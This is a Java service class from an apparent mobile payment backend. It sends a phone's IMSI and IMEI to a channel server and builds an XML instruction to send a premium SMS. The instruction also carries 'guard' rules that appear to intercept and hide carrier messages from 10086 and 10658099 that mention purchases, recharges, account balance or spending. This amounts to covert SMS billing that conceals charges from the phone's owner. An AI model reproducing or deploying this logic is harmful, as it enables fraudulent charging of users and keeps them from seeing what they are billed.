package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.commons.httpclient.NameValuePair;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.PostData;
import com.jxt.pay.appclient.utils.PostParamsData;

/**
 * 
 * 	http://chan.ringteck.com:8080/chanrs/fee.htm
 * POST data:
fee_type=3&cp_code=1111114&busine_no=100600&mob=12345678&fee=600&imsi=460025247007150&imei=860955024137576&province=2

 * @author leoliu
 *
 */
public class BjjsDm2DynamicService implements IDynamicService{

	private static final String TYPE = "bjjsDm2";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final Guard guard1 = new Guard("10658099","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658099","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
//			fee_type=3&cp_code=1111114&busine_no=100600&mob=12345678&fee=600&imsi=460025247007150&imei=860955024137576&province=2
			String fee_type = map.get("fee_type");
			String cp_code = map.get("cp_code");
			String busine_no = map.get("busine_no");
			String fee = map.get("fee");
			String imsi = map.get("imsi");
			String imei = map.get("imei");
			String province = "2";
			
			NameValuePair[] params = new NameValuePair[8];
			params[0] = new NameValuePair("fee_type", fee_type);
			params[1] = new NameValuePair("cp_code", cp_code);
			params[2] = new NameValuePair("busine_no", busine_no);
			params[3] = new NameValuePair("fee", fee);
			params[4] = new NameValuePair("imsi", imsi);
			params[5] = new NameValuePair("imei", imei);
			params[6] = new NameValuePair("province", province);
			params[7] = new NameValuePair("mob",imsi);
			
			String responseJson = PostParamsData.postData(url, params);
			
			xml = parseJson(map,responseJson);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	//{"fee_type":3,"dest_num":"1065843107","send_content":"ABd3b71bzc25bf4c7f8b47fe558868b0a195307f857a764424a1ff356e52d88e7d1f9b3c314320429996fb3f3146d56666","bill_id":147,"lid":"","cp_param":"","fee_state":1}
	private String parseJson(Map<String,String> map,String responseJson){
		
		if(responseJson != null && responseJson.length() > 20){
			try{
				JSONObject jo = new JSONObject(responseJson);
				
				String dest_num = jo.getString("dest_num");
				String send_content = jo.getString("send_content");
				
				List<Sms> smsList = new ArrayList<Sms>();
				
				Sms sms = new Sms();
				
				String append = map.get("append");
				if(append != null && append.length() > 0){
					send_content = send_content + "#"+append;
				}
				
				sms.setSmsContent(send_content);
				sms.setSmsDest(dest_num);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				smsList.add(sms);
				
				Sms guardSms = new Sms();
				
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard1);
				guardList.add(guard2);
				
				guardList.add(guard3);
				guardList.add(guard4);
				
				guardSms.setGuardList(guardList);
				
				smsList.add(0, guardSms);
					
				return XstreamHelper.toXml(smsList);
				
			}catch(Exception e){
				
			}
			
//			
		}
		
		return null;
	}
	
	public static void main(String[] args){
		String url = "http://chan.ringteck.com:8080/chanrs/fee.htm";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("channel", "10B101a87654322");
		
//		=&=&=&mob=12345678&=&=&=&=
		map.put("fee_type","3");
		map.put("cp_code","1111114");
		map.put("busine_no","100600");
		map.put("fee","600");
		map.put("imsi","460000562764234");
		map.put("imei","860955024137576");
		map.put("province","2");
		map.put("append", "0007");
		
		System.out.println(new BjjsDm2DynamicService().dynamic(map));
	}

}
